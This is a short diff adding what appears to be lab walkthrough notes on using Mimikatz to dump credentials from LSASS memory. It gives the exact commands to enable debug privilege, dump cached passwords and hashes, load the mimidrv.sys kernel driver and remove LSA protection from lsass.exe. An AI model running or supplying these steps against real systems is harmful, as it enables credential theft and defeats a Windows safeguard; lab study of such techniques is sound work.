@@ -1,0 +1,24 @@
+now, we will do the extraction of the lsass memory with mimikatz!
+
+mimikatz.exe
+
+Before dumping the memory for cashed credentials and hashes, we need to enable the SeDebugPrivilege and check the current permissions for memory access. It can be done by executing privilege::debug command as follows,
+privilege::debug
+
+dump all cached passwords and hashes using the following:
+sekurlsa::logonpasswords
+
+Note to get users' hashes, a user (victim) must have logged in to a system, and the user's credentials have been cached.
+If the LSA protection is enabled, we will get an error executing the "sekurlsa::logonpasswords" command.
+The command returns a 0x00000005 error code message (Access Denied).
+
+Lucky for us, Mimikatz provides a mimidrv.sys driver that works on kernel level to disable the LSA protection. We can import it to Mimikatz by executing "!+" as follows
+!+
+Note: If this fails with an isFileExist error, exit mimikatz, navigate to C:\Tools\Mimikatz\ and run the command again.
+
+Once the driver is loaded, we can disable the LSA protection by executing the following Mimikatz command:
+!processprotect /process:lsass.exe /remove
+
+Now try to run the sekurlsa::logonpasswords again.
+
+Note: we need an administrator powershell prompt for this.
